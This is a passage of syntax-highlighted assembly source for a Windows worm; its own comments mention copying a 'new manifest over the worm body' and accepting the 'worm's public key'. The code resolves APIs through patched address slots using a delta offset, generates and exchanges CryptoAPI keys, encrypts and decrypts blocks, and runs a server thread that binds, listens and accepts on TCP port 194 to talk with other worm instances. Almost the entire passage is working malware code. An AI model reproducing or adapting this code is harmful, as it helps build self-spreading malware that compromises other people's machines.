    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;create new one</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">err_ccc</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cProvider</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_CryptGenKey</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;create new public/private key pair</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;CF=0, everything OK</span><span class="sc0">
</span><span class="sc5">err_ccc</span><span class="sc4">:</span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;CF=1, error occured</span><span class="sc0">



</span><span class="sc5">wsa_startup</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WSAData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">101h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_WSAStartup</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;initialize WSOCK32.DLL</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc5">create_socket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_socket</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;create socket</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc5">export_key</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pubkey_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc5">public_key_length</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">public_key</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_CryptExportKey</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;export public key</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc5">import_key</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cXchgKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">cProvider</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_CryptImportKey</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;import public key</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc5">crypt_decrypt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">75h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">cKey</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_CryptDecrypt</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;decrypt one block</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc5">crypt_encrypt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">             </span><span class="sc1">;encrypted text block size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;size of plaintext to encrypt</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;address of plaintext</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">cXchgKey</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_CryptEncrypt</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;encrypt one block</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">






</span><span class="sc5">crypt_decrypt_final</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptDecrypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;decrypt final block</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc5">crypt_encrypt_final</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cXchgKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptEncrypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;encrypt final block</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">






</span><span class="sc5">copy_manifest</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cm_new_eh</span><span class="sc0">           </span><span class="sc1">;__try block</span><span class="sc0">


    </span><span class="sc1">;__except block</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esp.EH_ContextRecord</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get address of context</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ecx.CONTEXT_Esi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;repair ESI register</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ecx.CONTEXT_Edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;repair EDI register</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ecx.CONTEXT_Ecx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;repair ECX register</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc5">esp.EH_EstablisherFrame</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;repair ESP register</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc_page</span><span class="sc0">          </span><span class="sc1">;allocate next page</span><span class="sc0">
    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;remove SEH handler</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">copy_manifest</span><span class="sc0">           </span><span class="sc1">;and try again</span><span class="sc0">



</span><span class="sc5">cm_new_eh</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;copy new manifest over the worm body</span><span class="sc0">
    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;remove SEH handler</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">






</span><span class="sc1">;Server thread procedure</span><span class="sc0">

</span><span class="sc5">ServerThread</span><span class="sc0">    </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">st_end</span><span class="sc4">&gt;</span><span class="sc0">     </span><span class="sc1">;__try block</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">esp.cPushad</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get delta offset</span><span class="sc0">


    </span><span class="sc1">;INITIALIZATION...</span><span class="sc0">


    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_create_context</span><span class="sc0">        </span><span class="sc1">;initialize crypt32.dll</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">st_end</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">wsa_startup</span><span class="sc0">         </span><span class="sc1">;initialize wsock32.dll</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">crypt_st_end</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_socket</span><span class="sc0">           </span><span class="sc1">;create socket</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">wsa_st_end</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;save its handle</span><span class="sc0">


    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@socket</span><span class="sc0">
</span><span class="sc5">st_socket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0C200h</span><span class="sc0">              </span><span class="sc1">;TCP port 194</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0100007Fh</span><span class="sc0">
    </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@socket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_bind</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;bind to TCP port 194</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">20</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_listen</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;switch to listen mode</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">socket_st_end</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">num_of_clients</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc1">;nulify "number of handled clients"</span><span class="sc0">
                        </span><span class="sc1">;variable</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_GetTickCount</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get current count of ticks</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_ticks</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;save it</span><span class="sc0">


</span><span class="sc5">server_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_socket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get ptr to socket structure</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ten</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">_ten</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_accept</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;wait for incomming data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;save new socket</span><span class="sc0">



    </span><span class="sc1">;ACCEPTING WORM'S PUBLIC KEY...</span><span class="sc0">


